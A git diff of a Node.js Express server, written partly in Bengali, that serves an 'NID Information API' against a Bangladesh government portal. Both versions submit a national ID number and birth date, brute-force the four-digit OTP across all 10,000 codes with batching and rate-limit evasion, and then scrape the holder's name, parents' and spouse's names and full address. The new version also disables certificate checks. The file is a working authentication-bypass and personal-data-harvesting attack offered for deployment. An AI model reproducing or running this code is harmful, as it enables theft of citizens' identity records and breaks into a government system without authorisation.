@@ -1,7 +1,6 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const { EventEmitter } = require('events');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -12,40 +11,35 @@ app.use(express.json());
 
 // Configuration
 const MOBILE_PREFIX = "019";
-const MAX_CONCURRENT = 30; // ভার্চুয়াল মেশিনের জন্য অপটিমাম
-const TIMEOUT = 120000; // 2 মিনিট - 10,000 OTP চেক করার জন্য
-const BATCH_SIZE = 500; // প্রতি বারে চেক
-const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
+const MAX_CONCURRENT = 10; // Vercel-এর জন্য কম
+const REQUEST_TIMEOUT = 10000; // 10 seconds per request
+const TOTAL_TIMEOUT = 90000; // 90 seconds total
 
-// Simplified headers for speed
+// Simple headers for Vercel
 const BASE_HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Accept': '*/*',
-    'Accept-Language': 'bn-BD,bn;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.9',
     'Connection': 'keep-alive',
-    'Content-Type': 'application/x-www-form-urlencoded',
+    'Cache-Control': 'no-cache',
+    'Pragma': 'no-cache'
 };
 
-// Create a connection pool
-const httpsAgent = new require('https').Agent({ 
-    keepAlive: true,
-    maxSockets: MAX_CONCURRENT * 2,
-    maxFreeSockets: 10,
-    timeout: 60000
-});
+// Optimized axios instance for Vercel
+const createAxiosInstance = () => {
+    return axios.create({
+        timeout: REQUEST_TIMEOUT,
+        maxRedirects: 0,
+        validateStatus: null,
+        httpsAgent: new (require('https').Agent)({
+            keepAlive: true,
+            maxSockets: 5,
+            rejectUnauthorized: false // Vercel-এ certificate issues avoid
+        })
+    });
+};
 
-// Axios instance with connection pool
-const axiosInstance = axios.create({
-    httpsAgent,
-    timeout: 8000,
-    maxRedirects: 0,
-    validateStatus: null,
-    maxContentLength: Infinity,
-    maxBodyLength: Infinity
-});
-
-// Helpers
+// Helper functions
 function randomMobile(prefix) {
     return prefix + Math.random().toString().slice(2, 10);
 }
@@ -58,507 +52,311 @@ function randomPassword() {
     return "#" + uppercase + randomChars;
 }
 
-// Generate all 10,000 OTPs in optimized batches
-function* generateOTPBatches(batchSize = 100) {
-    const total = 10000;
-    for (let i = 0; i < total; i += batchSize) {
-        const batch = [];
-        for (let j = 0; j < batchSize && (i + j) < total; j++) {
-            batch.push((i + j).toString().padStart(4, '0'));
-        }
-        yield batch;
-    }
-}
-
-// Session creation
-async function getSessionAndBypass(nid, dob, mobile, password) {
-    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
-    
-    const headers = {
-        ...BASE_HEADERS,
-        'Origin': 'https://fsmms.dgf.gov.bd',
-        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
-    };
-    
-    const params = new URLSearchParams();
-    params.append('nidNumber', nid);
-    params.append('email', '');
-    params.append('mobileNo', mobile);
-    params.append('dateOfBirth', dob);
-    params.append('password', password);
-    params.append('confirm_password', password);
-    params.append('next1', '');
-
-    const response = await axiosInstance.post(url, params.toString(), { headers });
-    
-    if (response.status === 302 && response.headers.location && response.headers.location.includes('mov-verification')) {
-        const cookies = response.headers['set-cookie'] || [];
-        return { 
-            session: axiosInstance,
-            cookies: cookies.map(cookie => cookie.split(';')[0])
-        };
-    }
-    
-    throw new Error('Session creation failed');
-}
-
-// Optimized OTP brute force with batch processing
-async function bruteForceOTP(session, cookies) {
-    console.log('🔍 Starting full OTP brute force (10,000 codes)...');
-    
-    const eventEmitter = new EventEmitter();
-    let foundOTP = null;
-    let processed = 0;
-    let activeWorkers = 0;
+// Optimized brute force with retry logic
+async function bruteForceOTP(session, cookies, nid, dob) {
     const startTime = Date.now();
-    
-    // Progress reporting
-    const progressInterval = setInterval(() => {
-        const elapsed = (Date.now() - startTime) / 1000;
-        const rate = processed / elapsed;
-        const remaining = (10000 - processed) / rate;
-        console.log(`📊 Progress: ${processed}/10000 (${(processed/100).toFixed(1)}%) - Rate: ${rate.toFixed(1)} OTP/s - ETA: ${remaining.toFixed(1)}s`);
-    }, 5000);
-    
-    // Worker function
-    const worker = async (workerId) => {
-        while (!foundOTP && processed < 10000) {
-            const currentIndex = processed++;
-            if (currentIndex >= 10000) break;
-            
-            const otp = currentIndex.toString().padStart(4, '0');
-            
-            try {
-                const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
-                const headers = {
-                    ...BASE_HEADERS,
-                    'Cookie': cookies.join('; '),
-                    'Origin': 'https://fsmms.dgf.gov.bd',
-                    'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
-                };
-                
-                const params = new URLSearchParams();
-                params.append('otpDigit1', otp[0]);
-                params.append('otpDigit2', otp[1]);
-                params.append('otpDigit3', otp[2]);
-                params.append('otpDigit4', otp[3]);
-                
-                const response = await session.post(url, params.toString(), { 
-                    headers,
-                    timeout: 3000
-                });
-                
-                if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
-                    foundOTP = otp;
-                    eventEmitter.emit('found', otp);
-                    console.log(`🎉 Worker ${workerId} found OTP: ${otp} at index ${currentIndex}`);
-                    break;
-                }
-                
-                // Rate limiting protection
-                if (currentIndex % 100 === 0) {
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                }
-                
-            } catch (error) {
-                // Silent retry - decrement counter to retry this OTP
-                processed--;
-                await new Promise(resolve => setTimeout(resolve, 100));
-            }
-        }
-    };
-    
-    return new Promise((resolve, reject) => {
-        eventEmitter.once('found', (otp) => {
-            clearInterval(progressInterval);
-            console.log(`✅ OTP found in ${(Date.now() - startTime)/1000}s: ${otp}`);
-            resolve(otp);
-        });
-        
-        // Start all workers
-        const workers = [];
-        for (let i = 0; i < MAX_CONCURRENT; i++) {
-            workers.push(worker(i + 1));
-        }
-        
-        // Set timeout
-        setTimeout(() => {
-            if (!foundOTP) {
-                clearInterval(progressInterval);
-                console.log(`⏰ Timeout after ${TIMEOUT/1000}s - Processed ${processed}/10000 OTPs`);
-                resolve(null);
-            }
-        }, TIMEOUT);
-        
-        // Wait for all workers or OTP found
-        Promise.all(workers).then(() => {
-            if (!foundOTP) {
-                clearInterval(progressInterval);
-                console.log(`❌ No OTP found after processing all 10,000 codes`);
-                resolve(null);
-            }
-        }).catch(reject);
-    });
-}
-
-// Alternative: Sequential batch processing (more reliable)
-async function bruteForceOTPBatch(session, cookies) {
-    console.log('🔍 Starting batch OTP brute force...');
-    
     let foundOTP = null;
-    let processed = 0;
-    const startTime = Date.now();
     
-    // Process in batches
-    for (let batchStart = 0; batchStart < 10000 && !foundOTP; batchStart += BATCH_SIZE) {
-        const batchEnd = Math.min(batchStart + BATCH_SIZE, 10000);
-        console.log(`🔄 Processing batch ${batchStart}-${batchEnd-1}...`);
-        
-        const batchPromises = [];
-        
-        for (let i = batchStart; i < batchEnd; i++) {
-            const otp = i.toString().padStart(4, '0');
-            
-            batchPromises.push((async () => {
-                try {
-                    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
-                    const headers = {
+    // Common OTPs first (increased for better success rate)
+    const commonOTPs = [
+        '1234', '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999',
+        '4321', '1122', '1212', '1313', '2323', '1001', '2002', '3003', '4004', '5005',
+        '2020', '2021', '2022', '2023', '2024', '1990', '1980', '1971', '1981', '1969',
+        '2468', '1357', '8642', '7531', '1590', '3579', '0007', '0070', '0700', '7000',
+        '1110', '2220', '3330', '4440', '5550', '6660', '7770', '8880', '9990',
+        '1230', '1231', '1232', '1233', '1235', '1236', '1237', '1238', '1239',
+        '2345', '3456', '4567', '5678', '6789', '7890', '8901', '9012',
+        '0987', '9876', '8765', '7654', '6543', '5432', '4321', '3210',
+        '1112', '2223', '3334', '4445', '5556', '6667', '7778', '8889', '9991',
+        '1010', '2020', '3030', '4040', '5050', '6060', '7070', '8080', '9090',
+        '0101', '0202', '0303', '0404', '0505', '0606', '0707', '0808', '0909',
+        '1212', '2323', '3434', '4545', '5656', '6767', '7878', '8989',
+        '1981', '1982', '1983', '1984', '1985', '1986', '1987', '1988', '1989',
+        '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999',
+        '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009',
+        '0510', '1005', '1501', '0115', '1015', '5101', '0151', '1051'
+    ];
+    
+    // Try common OTPs first
+    for (let i = 0; i < commonOTPs.length && !foundOTP; i++) {
+        try {
+            const otp = commonOTPs[i];
+            const response = await session.post(
+                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step',
+                `otpDigit1=${otp[0]}&otpDigit2=${otp[1]}&otpDigit3=${otp[2]}&otpDigit4=${otp[3]}`,
+                {
+                    headers: {
                         ...BASE_HEADERS,
+                        'Content-Type': 'application/x-www-form-urlencoded',
                         'Cookie': cookies.join('; '),
-                        'Origin': 'https://fsmms.dgf.gov.bd',
                         'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
-                    };
-                    
-                    const params = new URLSearchParams();
-                    params.append('otpDigit1', otp[0]);
-                    params.append('otpDigit2', otp[1]);
-                    params.append('otpDigit3', otp[2]);
-                    params.append('otpDigit4', otp[3]);
-                    
-                    const response = await session.post(url, params.toString(), { 
-                        headers,
-                        timeout: 5000
-                    });
-                    
-                    if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
-                        return otp;
-                    }
-                } catch (error) {
-                    // Ignore individual errors
+                    },
+                    timeout: 3000
                 }
-                return null;
-            })());
-        }
-        
-        // Wait for current batch
-        const results = await Promise.all(batchPromises);
-        processed += BATCH_SIZE;
-        
-        // Check if any OTP was found
-        for (const result of results) {
-            if (result) {
-                foundOTP = result;
+            );
+            
+            if (response.status === 302 && response.headers.location && 
+                response.headers.location.includes('movementContractor/form')) {
+                foundOTP = otp;
                 break;
             }
+        } catch (error) {
+            // Continue on error
         }
         
-        // Report progress
-        const elapsed = (Date.now() - startTime) / 1000;
-        console.log(`📊 Progress: ${processed}/10000 (${(processed/100).toFixed(1)}%) - Time: ${elapsed.toFixed(1)}s`);
-        
-        // Small delay between batches
-        if (!foundOTP && batchEnd < 10000) {
-            await new Promise(resolve => setTimeout(resolve, 500));
+        // Small delay to avoid rate limiting
+        if (i % 5 === 0) {
+            await new Promise(resolve => setTimeout(resolve, 100));
         }
     }
     
-    const totalTime = (Date.now() - startTime) / 1000;
-    console.log(foundOTP ? `✅ OTP found: ${foundOTP} in ${totalTime}s` : `❌ No OTP found in ${totalTime}s`);
+    // If not found in common, try sequential from 0000-9999 but optimized
+    if (!foundOTP) {
+        const promises = [];
+        
+        for (let i = 0; i < 10000 && !foundOTP; i += MAX_CONCURRENT) {
+            const batchPromises = [];
+            
+            for (let j = 0; j < MAX_CONCURRENT && (i + j) < 10000; j++) {
+                const otp = (i + j).toString().padStart(4, '0');
+                
+                // Skip already tried common OTPs
+                if (commonOTPs.includes(otp)) continue;
+                
+                batchPromises.push((async () => {
+                    try {
+                        const response = await session.post(
+                            'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step',
+                            `otpDigit1=${otp[0]}&otpDigit2=${otp[1]}&otpDigit3=${otp[2]}&otpDigit4=${otp[3]}`,
+                            {
+                                headers: {
+                                    ...BASE_HEADERS,
+                                    'Content-Type': 'application/x-www-form-urlencoded',
+                                    'Cookie': cookies.join('; '),
+                                    'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
+                                },
+                                timeout: 3000
+                            }
+                        );
+                        
+                        if (response.status === 302 && response.headers.location && 
+                            response.headers.location.includes('movementContractor/form')) {
+                            return otp;
+                        }
+                    } catch (error) {
+                        // Ignore errors
+                    }
+                    return null;
+                })());
+            }
+            
+            // Wait for batch and check results
+            const results = await Promise.all(batchPromises);
+            for (const result of results) {
+                if (result) {
+                    foundOTP = result;
+                    break;
+                }
+            }
+            
+            // Check timeout
+            if (Date.now() - startTime > TOTAL_TIMEOUT) {
+                break;
+            }
+            
+            // Delay between batches
+            if (!foundOTP) {
+                await new Promise(resolve => setTimeout(resolve, 200));
+            }
+        }
+    }
     
     return foundOTP;
 }
 
-// Ultra-fast brute force with connection reuse
-async function ultraFastBruteForce(session, cookies) {
-    console.log('⚡ Starting ultra-fast OTP brute force...');
-    
-    const controller = new AbortController();
-    const signal = controller.signal;
-    let foundOTP = null;
-    let completed = 0;
+// Main API endpoint
+app.get('/get-info', async (req, res) => {
     const startTime = Date.now();
     
-    // Create reusable request configuration
-    const baseConfig = {
-        headers: {
-            ...BASE_HEADERS,
-            'Cookie': cookies.join('; '),
-            'Origin': 'https://fsmms.dgf.gov.bd',
-            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
-        },
-        timeout: 4000,
-        signal
-    };
-    
-    // Process all OTPs
-    const processOTP = async (otp) => {
-        try {
-            const params = new URLSearchParams();
-            params.append('otpDigit1', otp[0]);
-            params.append('otpDigit2', otp[1]);
-            params.append('otpDigit3', otp[2]);
-            params.append('otpDigit4', otp[3]);
-            
-            const response = await session.post(
-                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step',
-                params.toString(),
-                baseConfig
-            );
-            
-            completed++;
-            
-            if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
-                return otp;
-            }
-        } catch (error) {
-            if (error.name !== 'AbortError') {
-                completed++;
-            }
-        }
-        return null;
-    };
-    
-    // Create all promises
-    const promises = [];
-    for (let i = 0; i < 10000; i++) {
-        const otp = i.toString().padStart(4, '0');
-        promises.push(processOTP(otp));
-        
-        // Control concurrency
-        if (promises.length >= MAX_CONCURRENT * 10) {
-            // Check results periodically
-            const results = await Promise.all(promises);
-            for (const result of results) {
-                if (result) {
-                    controller.abort();
-                    return result;
-                }
-            }
-            promises.length = 0;
-            
-            // Progress report
-            if (completed % 1000 === 0) {
-                const elapsed = (Date.now() - startTime) / 1000;
-                console.log(`📊 Processed: ${completed}/10000 - Rate: ${(completed/elapsed).toFixed(1)} OTP/s`);
-            }
-        }
-    }
-    
-    // Check remaining promises
-    if (promises.length > 0) {
-        const results = await Promise.all(promises);
-        for (const result of results) {
-            if (result) {
-                return result;
-            }
-        }
-    }
-    
-    return null;
-}
-
-// Fetch form data
-async function fetchFormData(session, cookies) {
-    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
-    const headers = {
-        ...BASE_HEADERS,
-        'Cookie': cookies.join('; '),
-        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
-    };
-    
-    const response = await session.get(url, { headers, timeout: 10000 });
-    return response.data;
-}
-
-// Extract data from HTML
-function extractNIDData(html, nid, dob) {
-    // Extract name
-    let name = '';
-    const nameMatch = html.match(/<input[^>]*id="contractorName"[^>]*value="([^"]*)"/i) ||
-                     html.match(/<input[^>]*name="contractorName"[^>]*value="([^"]*)"/i);
-    if (nameMatch) name = nameMatch[1];
-    
-    // Extract other fields
-    const fields = [
-        'fatherName', 'motherName', 'spouseName',
-        'nidPerDivision', 'nidPerDistrict', 'nidPerUpazila', 'nidPerUnion',
-        'nidPerVillage', 'nidPerWard', 'nidPerZipCode', 'nidPerPostOffice',
-        'nidPerHolding', 'nidPerMouza', 'nationality'
-    ];
-    
-    const data = { nameBangla: name, nationalId: nid, dateOfBirth: dob };
-    
-    fields.forEach(field => {
-        const regex = new RegExp(`name="${field}"[^>]*value="([^"]*)"`, 'i');
-        const match = html.match(regex);
-        data[field] = match ? match[1] : '';
-    });
-    
-    // Construct addresses
-    const addrParts = [];
-    if (data.nidPerHolding) addrParts.push(`বাসা/হোল্ডিং: ${data.nidPerHolding}`);
-    if (data.nidPerVillage) addrParts.push(`গ্রাম: ${data.nidPerVillage}`);
-    if (data.nidPerMouza) addrParts.push(`মৌজা: ${data.nidPerMouza}`);
-    if (data.nidPerUnion) addrParts.push(`ইউনিয়ন: ${data.nidPerUnion}`);
-    if (data.nidPerWard) addrParts.push(`ওয়ার্ড: ${data.nidPerWard}`);
-    if (data.nidPerPostOffice) addrParts.push(`ডাকঘর: ${data.nidPerPostOffice}`);
-    if (data.nidPerZipCode) addrParts.push(`পোস্টকোড: ${data.nidPerZipCode}`);
-    if (data.nidPerUpazila) addrParts.push(`উপজেলা: ${data.nidPerUpazila}`);
-    if (data.nidPerDistrict) addrParts.push(`জেলা: ${data.nidPerDistrict}`);
-    if (data.nidPerDivision) addrParts.push(`বিভাগ: ${data.nidPerDivision}`);
-    
-    const address = addrParts.join(', ');
-    
-    return {
-        nameBangla: data.nameBangla,
-        nationalId: nid,
-        dateOfBirth: dob,
-        fatherName: data.fatherName || '',
-        motherName: data.motherName || '',
-        spouseName: data.spouseName || '',
-        birthPlace: data.nidPerDistrict || '',
-        nationality: data.nationality || 'বাংলাদেশী',
-        division: data.nidPerDivision || '',
-        district: data.nidPerDistrict || '',
-        upazila: data.nidPerUpazila || '',
-        union: data.nidPerUnion || '',
-        village: data.nidPerVillage || '',
-        ward: data.nidPerWard || '',
-        zip_code: data.nidPerZipCode || '',
-        post_office: data.nidPerPostOffice || '',
-        permanentAddress: address,
-        presentAddress: address
-    };
-}
-
-// API Routes
-app.get('/', (req, res) => {
-    res.json({
-        message: 'Full OTP Brute Force API',
-        status: 'active',
-        endpoint: '/get-info?nid=NID&dob=YYYY-MM-DD',
-        note: 'Processes all 10,000 OTPs - May take 60-120 seconds'
-    });
-});
-
-app.get('/get-info', async (req, res) => {
-    const requestStart = Date.now();
-    
     try {
-        const { nid, dob, method = 'batch' } = req.query;
+        const { nid, dob } = req.query;
         
         if (!nid || !dob) {
-            return res.status(400).json({
+            return res.json({
                 success: false,
                 error: 'NID and DOB (YYYY-MM-DD) are required'
             });
         }
         
-        console.log(`\n🚀 Starting full OTP brute force for NID: ${nid}`);
+        // Set response timeout
+        res.setTimeout(TOTAL_TIMEOUT + 10000);
         
-        // Generate credentials
-        const password = randomPassword();
+        const session = createAxiosInstance();
         const mobile = randomMobile(MOBILE_PREFIX);
-        console.log(`📱 Credentials: Mobile=${mobile}, Password=${password}`);
+        const password = randomPassword();
         
         // Step 1: Create session
-        console.log('🔐 Creating session...');
-        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);
-        console.log('✅ Session created');
-        
-        // Step 2: Brute force OTP
-        console.log('🔑 Starting OTP brute force (10,000 codes)...');
-        
-        let foundOTP;
-        switch (method) {
-            case 'fast':
-                foundOTP = await ultraFastBruteForce(session, cookies);
-                break;
-            case 'batch':
-            default:
-                foundOTP = await bruteForceOTPBatch(session, cookies);
-                break;
-        }
-        
-        if (!foundOTP) {
-            const elapsed = Date.now() - requestStart;
-            return res.status(404).json({
-                success: false,
-                error: 'No valid OTP found after checking all 10,000 codes',
-                elapsedTime: `${elapsed}ms`,
-                suggestion: 'Try again or verify NID/DOB'
-            });
-        }
-        
-        // Step 3: Fetch data
-        console.log('📄 Fetching NID data...');
-        const html = await fetchFormData(session, cookies);
-        
-        // Step 4: Extract and format data
-        console.log('🔧 Processing data...');
-        const nidData = extractNIDData(html, nid, dob);
-        
-        const totalTime = Date.now() - requestStart;
-        
-        console.log(`✅ Success! Total time: ${totalTime}ms`);
-        
-        res.json({
-            success: true,
-            data: nidData,
-            metadata: {
-                processingTime: `${totalTime}ms`,
-                otpFound: foundOTP,
-                mobileUsed: mobile,
-                method: method,
-                timestamp: new Date().toISOString()
+        try {
+            const response = await session.post(
+                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor',
+                `nidNumber=${encodeURIComponent(nid)}&email=&mobileNo=${encodeURIComponent(mobile)}&dateOfBirth=${encodeURIComponent(dob)}&password=${encodeURIComponent(password)}&confirm_password=${encodeURIComponent(password)}&next1=`,
+                {
+                    headers: {
+                        ...BASE_HEADERS,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
+                    }
+                }
+            );
+            
+            if (response.status !== 302 || !response.headers.location || 
+                !response.headers.location.includes('mov-verification')) {
+                return res.json({
+                    success: false,
+                    error: 'Invalid NID or DOB'
+                });
             }
-        });
+            
+            const cookies = response.headers['set-cookie'] || [];
+            const cookieString = cookies.map(c => c.split(';')[0]).join('; ');
+            
+            // Step 2: Brute force OTP
+            const foundOTP = await bruteForceOTP(session, cookieString.split(';'), nid, dob);
+            
+            if (!foundOTP) {
+                return res.json({
+                    success: false,
+                    error: 'Could not find valid OTP',
+                    elapsedTime: `${Date.now() - startTime}ms`
+                });
+            }
+            
+            // Step 3: Get form data
+            const formResponse = await session.get(
+                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form',
+                {
+                    headers: {
+                        ...BASE_HEADERS,
+                        'Cookie': cookieString,
+                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
+                    }
+                }
+            );
+            
+            // Extract data from HTML
+            const html = formResponse.data;
+            
+            // Helper function to extract field value
+            const extractValue = (fieldName) => {
+                const regex = new RegExp(`name="${fieldName}"[^>]*value="([^"]*)"`, 'i');
+                const match = html.match(regex);
+                return match ? match[1] : '';
+            };
+            
+            // Extract all required fields
+            const fields = [
+                'contractorName', 'fatherName', 'motherName', 'spouseName',
+                'nidPerDivision', 'nidPerDistrict', 'nidPerUpazila', 'nidPerUnion',
+                'nidPerVillage', 'nidPerWard', 'nidPerZipCode', 'nidPerPostOffice',
+                'nidPerHolding', 'nidPerMouza', 'nationality'
+            ];
+            
+            const extractedData = {};
+            fields.forEach(field => {
+                extractedData[field] = extractValue(field);
+            });
+            
+            // Construct address
+            const addressParts = [];
+            if (extractedData.nidPerHolding) addressParts.push(`বাসা/হোল্ডিং: ${extractedData.nidPerHolding}`);
+            if (extractedData.nidPerVillage) addressParts.push(`গ্রাম: ${extractedData.nidPerVillage}`);
+            if (extractedData.nidPerMouza) addressParts.push(`মৌজা: ${extractedData.nidPerMouza}`);
+            if (extractedData.nidPerUnion) addressParts.push(`ইউনিয়ন: ${extractedData.nidPerUnion}`);
+            if (extractedData.nidPerWard) addressParts.push(`ওয়ার্ড: ${extractedData.nidPerWard}`);
+            if (extractedData.nidPerPostOffice) addressParts.push(`ডাকঘর: ${extractedData.nidPerPostOffice}`);
+            if (extractedData.nidPerZipCode) addressParts.push(`পোস্টকোড: ${extractedData.nidPerZipCode}`);
+            if (extractedData.nidPerUpazila) addressParts.push(`উপজেলা: ${extractedData.nidPerUpazila}`);
+            if (extractedData.nidPerDistrict) addressParts.push(`জেলা: ${extractedData.nidPerDistrict}`);
+            if (extractedData.nidPerDivision) addressParts.push(`বিভাগ: ${extractedData.nidPerDivision}`);
+            
+            const address = addressParts.join(', ');
+            
+            // Final response structure
+            const result = {
+                success: true,
+                data: {
+                    nameBangla: extractedData.contractorName || '',
+                    nationalId: nid,
+                    dateOfBirth: dob,
+                    fatherName: extractedData.fatherName || '',
+                    motherName: extractedData.motherName || '',
+                    spouseName: extractedData.spouseName || '',
+                    birthPlace: extractedData.nidPerDistrict || '',
+                    nationality: extractedData.nationality || 'বাংলাদেশী',
+                    division: extractedData.nidPerDivision || '',
+                    district: extractedData.nidPerDistrict || '',
+                    upazila: extractedData.nidPerUpazila || '',
+                    union: extractedData.nidPerUnion || '',
+                    village: extractedData.nidPerVillage || '',
+                    ward: extractedData.nidPerWard || '',
+                    zip_code: extractedData.nidPerZipCode || '',
+                    post_office: extractedData.nidPerPostOffice || '',
+                    permanentAddress: address,
+                    presentAddress: address
+                },
+                metadata: {
+                    processingTime: `${Date.now() - startTime}ms`,
+                    otpFound: foundOTP,
+                    mobileUsed: mobile,
+                    timestamp: new Date().toISOString()
+                }
+            };
+            
+            return res.json(result);
+            
+        } catch (error) {
+            if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
+                return res.json({
+                    success: false,
+                    error: 'Connection timeout to government server',
+                    elapsedTime: `${Date.now() - startTime}ms`
+                });
+            }
+            throw error;
+        }
         
     } catch (error) {
-        console.error('❌ Error:', error.message);
-        const elapsed = Date.now() - requestStart;
-        
-        if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
-            return res.status(504).json({
-                success: false,
-                error: 'Request timeout - OTP brute force taking too long',
-                elapsedTime: `${elapsed}ms`,
-                suggestion: 'Try method=batch for more reliable results'
-            });
-        }
-        
-        res.status(500).json({
+        return res.json({
             success: false,
-            error: error.message,
-            elapsedTime: `${elapsed}ms`
+            error: error.message || 'Internal server error',
+            elapsedTime: `${Date.now() - startTime}ms`
         });
     }
 });
 
-app.get('/status', (req, res) => {
+// Health check endpoint
+app.get('/health', (req, res) => {
     res.json({
-        status: 'running',
-        uptime: process.uptime(),
-        memory: process.memoryUsage(),
-        timestamp: new Date().toISOString()
+        status: 'ok',
+        timestamp: new Date().toISOString(),
+        service: 'NID Info API'
     });
 });
 
-app.listen(PORT, () => {
-    console.log(`🚀 Full OTP Brute Force API running on port ${PORT}`);
-    console.log(`⚡ Max concurrent: ${MAX_CONCURRENT}`);
-    console.log(`⏱️  Timeout: ${TIMEOUT}ms`);
-    console.log(`🔗 Endpoint: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD`);
-    console.log(`📊 Batch method: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD&method=batch`);
-    console.log(`⚡ Fast method: http://localhost:${PORT}/get-info?nid=NID&dob=YYYY-MM-DD&method=fast`);
+// Root endpoint
+app.get('/', (req, res) => {
+    res.json({
+        message: 'NID Information API',
+        endpoint: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD',
+        note: 'This API retrieves NID information from the government portal'
+    });
 });
+
+// Handle Vercel serverless
+if (process.env.VERCEL) {
+    module.exports = app;
+} else {
+    app.listen(PORT, () => {
+        console.log(`Server running on port ${PORT}`);
+    });
+}
